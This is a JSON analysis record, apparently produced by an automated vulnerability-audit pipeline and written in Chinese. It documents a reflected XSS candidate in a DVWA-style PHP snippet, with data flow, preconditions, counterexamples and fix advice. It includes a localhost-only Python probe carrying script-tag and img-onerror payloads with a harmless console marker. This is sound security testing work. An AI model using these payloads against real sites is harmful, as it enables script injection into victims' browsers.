@@ -1,0 +1,126 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "XSS-001",
+  "input_version": "v2",
+  "prompt_version": "final-wp4-v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": ["XSS-001"],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "medium",
+    "reason": "第4行对 GET name 的存在性判断与第6行把原始值无编码拼接进 HTML 文本上下文均有逐字证据，输入可控性与危险拼接点静态完整；但最终输出 sink（$html 插入 page['body'] 及 dvwaHtmlEcho 的实现）源码未随包提供，最终是否二次编码、以及页面路径/认证/难度条件未知，故为 medium 而非 high。"
+  },
+  "findings": [
+    {
+      "finding_id": "XSS-001-F1",
+      "vulnerability_type": "反射型跨站脚本（Reflected XSS）",
+      "locations": [
+        {
+          "fragment_id": "XSS-001",
+          "line_start": 4,
+          "line_end": 4,
+          "quote": "if( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) {"
+        },
+        {
+          "fragment_id": "XSS-001",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';"
+        },
+        {
+          "fragment_id": "XSS-001",
+          "line_start": 2,
+          "line_end": 2,
+          "quote": "header (\"X-XSS-Protection: 0\");"
+        }
+      ],
+      "data_flow": [
+        "第4行：顶层请求处理逻辑通过 array_key_exists(\"name\", $_GET) 读取 GET 参数 name，并仅做 != NULL 的宽松非空判断（不是过滤，也不做字符替换）。",
+        "第6行：$_GET['name'] 原值通过字符串连接直接进入 $html 的 HTML 文本上下文：'<pre>Hello ' . $_GET['name'] . '</pre>'，此处没有 htmlspecialchars、htmlentities、strip_tags、白名单或长度/字符约束。",
+        "第2行：响应头显式设置 X-XSS-Protection: 0，关闭旧版浏览器的反射型 XSS 过滤器兜底（现代浏览器已移除该过滤器，因此这既非有效防护也非执行保证）。",
+        "外围（仅按输入描述，未提供源码）：$html 被插入 page['body']，随后由 dvwaHtmlEcho 输出到 HTTP 响应；该最终输出是否做二次编码未知，属于待补证环节。",
+        "观察点：响应体中第6行生成的 <pre>Hello ...</pre> 区块；浏览器加载带载荷 URL 后 DevTools Console 的无害标记输出。"
+      ],
+      "principle": "服务端把用户可控的 GET 参数直接拼接进即将输出的 HTML 文本节点（<pre> 内），未做 HTML 实体编码；浏览器将该字符串解析为 HTML，其中 <script> 等标签被当作标记执行而非文本显示，形成反射型 XSS。第2行的 X-XSS-Protection: 0 进一步表明未依赖浏览器端过滤。",
+      "impact": "在受害者浏览器、目标站点同源上下文中执行任意 JavaScript（本次教学验证只用 console.log 无害标记），可读取当前页面 DOM 内容、以受害者已登录会话发起同源请求或篡改页面展示；实际危害取决于外围会话与页面权限，未实测。",
+      "preconditions": [
+        "目标部署由外围处理器（另存 context/）加载本片段，且确实把 $html 未编码地写入 page['body'] 并经 dvwaHtmlEcho 输出到响应。",
+        "GET 参数 name 的请求可达该页面，且页面不额外做入口层字符过滤或参数重写（给定片段内无此类逻辑）。",
+        "受害者会话（若页面要求登录）打开含载荷的 URL；本片段本身不校验 token，token 要求取决于未提供的外围实现。",
+        "浏览器按 HTML 解析该响应；不使用会清除内联脚本的严格 CSP（响应头配置未知）。"
+      ],
+      "counterexamples": [
+        "若 dvwaHtmlEcho 或 page['body'] 组装阶段对内容做了 HTML 实体编码（如 htmlspecialchars），则 <script> 只以文本显示，该路径不成立——但外围源码未提供，不能据此排除或确认。",
+        "若目标路径前置了服务端输入过滤（替换 <、>、引号）或 WAF 规则，则载荷可能被改写；给定片段中未见任何此类处理，但部署层是否另有过滤未知。",
+        "若部署启用了不含 'unsafe-inline' 的严格 CSP，内联脚本会被浏览器阻止；该配置未给出，属于未知条件。",
+        "若用户未通过外围登录会话或页面实际不输出该 <pre> 区块，则请求无法到达第6行输出（属前置条件失败，不是防护生效）。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# XSS-001 verification draft: reflected XSS via GET 'name' into '<pre>Hello ...</pre>' (line 6).\n# Lab scope only: localhost / 127.0.0.1 / ::1. http.client never follows redirects.\n# Harmless marker only (console.log). No Cookie reading, no exfiltration.\n#\n# Usage:\n#   python poc_xss_001.py --base-url http://127.0.0.1 --page-path /<page-path>/ \\\n#       --cookie 'PHPSESSID=<session>' --marker LLM_LAB_XSS\n#\n# --page-path is NOT in the audited snippet: supply the real deployment path.\n# --cookie is optional: the outer handler starts a login session, so it may be required.\nimport argparse\nimport http.client\nimport html\nimport sys\nfrom urllib.parse import urlsplit, urlencode\n\nLOCAL_HOSTS = {'localhost', '127.0.0.1', '::1'}\nHELLO_OPEN = '<pre>Hello '\nHELLO_CLOSE = '</pre>'\n\n\ndef parse_args():\n    p = argparse.ArgumentParser(description='XSS-001 local verification draft')\n    p.add_argument('--base-url', default='http://127.0.0.1')\n    p.add_argument('--page-path', required=True, help='page path (not present in the audited snippet)')\n    p.add_argument('--cookie', default='', help='optional session cookie; never commit or print it')\n    p.add_argument('--marker', default='LLM_LAB_XSS')\n    p.add_argument('--timeout', type=float, default=10.0)\n    return p.parse_args()\n\n\ndef check_target(base_url):\n    parts = urlsplit(base_url)\n    if parts.scheme not in ('http', 'https'):\n        raise SystemExit('refused: only http/https allowed, got %r' % (parts.scheme,))\n    if (parts.hostname or '') not in LOCAL_HOSTS:\n        raise SystemExit('refused: host must be localhost/127.0.0.1/::1, got %r' % (parts.hostname,))\n    return parts.scheme, parts.hostname, parts.port\n\n\ndef build_payloads(marker):\n    q = chr(39)\n    return [\n        ('script', '<script>console.log(' + q + marker + q + ')</script>'),\n        ('img', '<img src=x onerror=console.log(' + q + marker + q + ')>'),\n    ]\n\n\ndef http_get(scheme, host, port, path, cookie, timeout):\n    cls = http.client.HTTPSConnection if scheme == 'https' else http.client.HTTPConnection\n    conn = cls(host, port, timeout=timeout)\n    headers = {'Accept': 'text/html', 'User-Agent': 'llm-lab-xss001-draft'}\n    if cookie:\n        headers['Cookie'] = cookie\n    try:\n        conn.request('GET', path, headers=headers)\n        resp = conn.getresponse()\n        return resp.status, resp.read().decode('utf-8', 'replace')\n    finally:\n        conn.close()\n\n\ndef hello_region(body):\n    start = body.find(HELLO_OPEN)\n    if start < 0:\n        return None\n    start += len(HELLO_OPEN)\n    end = body.find(HELLO_CLOSE, start)\n    return None if end < 0 else body[start:end]\n\n\ndef classify(region, marker):\n    if region is None:\n        return 'NOT_RENDERED', 'no <pre>Hello ...</pre> area found in the response'\n    if '<script>' in region and marker in region:\n        return 'RAW_REFLECTION', 'raw <script> marker inside the Hello area'\n    decoded = html.unescape(region)\n    if '&lt;script&gt;' in region and marker in decoded:\n        return 'HTML_ENCODED', 'marker only present after HTML-decoding'\n    if marker in region or marker in decoded:\n        return 'OTHER_CONTEXT', 'marker reflected but not as a recognizable script tag'\n    return 'MARKER_ABSENT', 'marker missing from the Hello area'\n\n\ndef main():\n    args = parse_args()\n    scheme, host, port = check_target(args.base_url)\n    if not args.page_path.startswith('/'):\n        raise SystemExit('--page-path must start with /')\n    print('[i] target %s://%s%s%s (local only)' % (scheme, host, ':' + str(port) if port else '', args.page_path))\n    if args.cookie:\n        print('[i] session cookie supplied (value not printed)')\n    for label, payload in build_payloads(args.marker):\n        query = urlencode({'name': payload})\n        sep = '&' if '?' in args.page_path else '?'\n        path = args.page_path + sep + query\n        status, body = http_get(scheme, host, port, path, args.cookie, args.timeout)\n        region = hello_region(body)\n        result, detail = classify(region, args.marker)\n        print('[probe=%s] HTTP %s' % (label, status))\n        print('  parsed-area   : %r' % (region,))\n        print('  classification: %s (%s)' % (result, detail))\n        if result == 'RAW_REFLECTION':\n            print('  note: payload reflected unencoded; browser execution still needs manual confirmation')\n        elif result == 'HTML_ENCODED':\n            print('  note: output encoding observed; script execution not expected on this path')\n    print('manual browser step: load the same URL, watch DevTools Console for %s, save screenshot' % args.marker)\n    print('cleanup: reflected request only, no stored record; discard the test browser tab/session')\n\n\nif __name__ == '__main__':\n    try:\n        main()\n    except OSError as exc:\n        sys.exit('request/environment error: %s' % exc)\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+（仅标准库：argparse、http.client、html、urllib.parse、sys）"
+        ],
+        "parameters": [
+          "--base-url：靶场基址，默认 http://127.0.0.1；仅允许 localhost/127.0.0.1/::1，非本地主机直接拒绝执行。",
+          "--page-path：承载本片段的外围页面路径（必填）。给定代码片段未包含路径，必须由部署环境提供，不能从其他关卡套用。",
+          "--cookie：可选会话 Cookie（外层处理器启动登录会话，可能必需）；真实口令/Cookie 不写入仓库、不回显。",
+          "--marker：无害控制台标记，默认 LLM_LAB_XSS。",
+          "--timeout：请求超时秒数，默认 10。",
+          "GET 参数 name 与请求方法 GET 均取自给定代码第4、6行；不使用其他样本参数。"
+        ],
+        "steps": [
+          "记录部署来源提交、PHP 版本、浏览器版本与操作系统，以及目标页面完整路径、登录状态与难度配置（这些不在包内）。",
+          "建立基线：在同一会话访问不带 name 参数的页面，确认响应中 <pre>Hello ...</pre> 区块存在及其在响应中的位置（正常行）。",
+          "运行：python poc_xss_001.py --base-url http://127.0.0.1 --page-path <实测页面路径> --cookie 'PHPSESSID=<会话>'。",
+          "读取输出中的 parsed-area（第6行生成区块的逐字内容）与 classification，而不是只看 HTTP 状态码/长度/哈希；把原始响应与脚本保存到工作包4证据目录。",
+          "在同一会话用浏览器打开脚本使用的同一 URL（含 script 探针），按浏览器版本打开 DevTools Console，人工确认是否出现 LLM_LAB_XSS 并截图。",
+          "再跑 img 探针作为对照（文本上下文内标签解析与事件处理属性两条路径），分别记录执行/未执行。",
+          "回读与清理：本片段为纯反射、无持久化写入，无需数据库清理；关闭测试标签页并丢弃测试会话。若测试中创建了额外账号，需按原值独立回查后定向删除该测试账号（不清空全表）。",
+          "若部署要求会话 token（本片段未使用 token，未知外围是否要求），必须在同一会话每次按请求获取最新 token；token 缺失或被拒绝记为前置条件失败，不得写成输出编码或过滤生效。"
+        ],
+        "expected_observation": "HTTP 回读阶段：response 中存在第6行生成的 <pre>Hello ...</pre> 区块，区块内出现未编码的 <script>console.log('LLM_LAB_XSS')</script>（classification=RAW_REFLECTION），即原始 < 与 > 未被实体化；img 探针则出现未编码的 <img src=x onerror=...>。浏览器阶段：人工打开同一 URL 后 DevTools Console 打印 LLM_LAB_XSS，页面源码中该区块保持标签原样。对照现象：若区块内只出现 &lt;script&gt;（classification=HTML_ENCODED）且 Console 无输出，说明该路径存在输出编码；若返回 NOT_RENDERED，请区分会话/路径错误与片段未包含。以上均为待运行草案的预期，非已观测结果。",
+        "success_criteria": "1) 脚本输出的 parsed-area 明确解析到第6行生成的 <pre>Hello ...</pre> 区块并逐字记录，而非仅以 HTTP 200/响应长度/哈希作为证据。\n2) 该区块内出现未编码的 <script>console.log('LLM_LAB_XSS')</script> 标签（RAW_REFLECTION），证明 name 值未经 HTML 编码进入文本节点。\n3) 同会话真实浏览器加载同一 URL 后 DevTools Console 出现 LLM_LAB_XSS，记录浏览器版本、URL、截图并保存到工作包4证据路径；HTTP 回显本身不算触发。\n4) 对照组成立：基线无 name 请求显示普通 Hello 区块；img 探针与 script 探针结果分别记录，编码显示与脚本执行分开描述。\n5) 若观察为 HTML_ENCODED（仅 &lt;script&gt;）且浏览器无标记，则该路径受输出编码保护，判为排除；若为 NOT_RENDERED 或会话失效，记为前置条件失败而非防护生效。\n6) 清理完成：反射型请求无持久记录，确认测试会话丢弃、无残留测试数据。",
+        "limitations": [
+          "status 为需人工适配：--page-path、会话状态、难度配置不在给定代码内，必须由部署实测补齐。",
+          "本脚本仅覆盖 HTTP 提交与响应回读，浏览器实际执行必须人工观测（本次未运行）。",
+          "仅验证文本上下文路径；若外围把 $html 放入属性或 JS 字符串上下文，需按实际渲染位置调整载荷。",
+          "未测量服务端长度限制：给定片段无长度过滤证据，前端 maxlength 若存在也不影响服务端；长载荷可能被外围截断，需在实测中确认。",
+          "X-XSS-Protection: 0 仅在旧版浏览器生效，现代浏览器已移除该过滤器；脚本不据此推断触发/阻止。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "外围处理器源码（$html 插入 page['body'] 的方式）与 dvwaPage.inc.php 中 dvwaHtmlEcho 的实现：最终输出是否再次编码未知。",
+    "承载本片段的具体页面路径与参数挂载点（请求路径不在给定代码内）。",
+    "PHP 版本、Web 服务器与浏览器版本，以及 X-XSS-Protection 在不同浏览器中的实际处理差异。",
+    "认证开关、登录会话建立方式与难度选择配置；是否要求 token（本片段未出现 token）。",
+    "是否存在 CSP、反向代理或 WAF 等响应头/入口层过滤，可能改变触发条件。",
+    "同一 $html 是否被其他页面复用（如有写入-读取路径，需另行提供存储与读取代码，不能由本反射片段推断）。"
+  ],
+  "risk_notes": [
+    "第2行显式关闭 X-XSS-Protection，属防御配置风险：旧版浏览器失去反射型 XSS 过滤器兜底。",
+    "若该片段所在页面的会话具有管理权限，反射型 XSS 可借会话发起同源敏感操作；本次未评估权限模型。",
+    "若另有写入路径把 name 类输入持久化并在其他页面输出，风险将扩展为存储型；包内无持久化代码，不作为本样本结论。"
+  ],
+  "quality_notes": [
+    "第4行使用 != NULL 宽松比较，应改用 isset() 或 !== null。",
+    "第4行 array_key_exists 与 != NULL 同时判断存在冗余，可合并为 isset($_GET['name']) && $_GET['name'] !== ''。",
+    "第2行 X-XSS-Protection: 0 为已被现代浏览器移除的过时响应头，属遗留代码，不应作为任何防护依据。",
+    "第6行直接字符串拼接输出，缺少 htmlspecialchars($value, ENT_QUOTES, 'UTF-8') 一类的输出编码。"
+  ],
+  "limitations": [
+    "仅基于本次收到的 XSS-001 单包（含片段与外围调用关系描述）做静态分析；未运行任何请求或浏览器。",
+    "最终 sink 实现（dvwaHtmlEcho、page['body'] 组装）源码未提供，无法确认输出上下文与是否二次编码，故结论为候选而非确认。",
+    "页面路径、认证状态、难度配置、PHP/浏览器版本均未实测，POC 需人工适配后才能运行。",
+    "行号为标准化代码块 XSS-001.php 的 1 起始局部行号（1=<?php，4=if 判断，6=拼接行）；未做全局行号映射。",
+    "本次未收到其他父样本包，不存在跨包合并；同一片段的重复证据按同一 finding 归并。"
+  ],
+  "runtime_evidence": []
+}
